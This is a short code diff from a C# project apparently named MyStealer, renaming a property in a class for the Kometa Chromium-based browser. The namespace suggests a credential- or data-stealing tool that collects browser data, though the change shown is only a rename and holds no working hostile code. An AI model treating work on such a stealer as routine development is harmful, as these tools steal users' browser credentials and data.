@@ -5,7 +5,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
 {
     public class Kometa : Chromium
     {
-        public override string ModuleName => "Kometa";
+        public override string Name => "Kometa";
 
         public override bool HasProfiles => false;
 
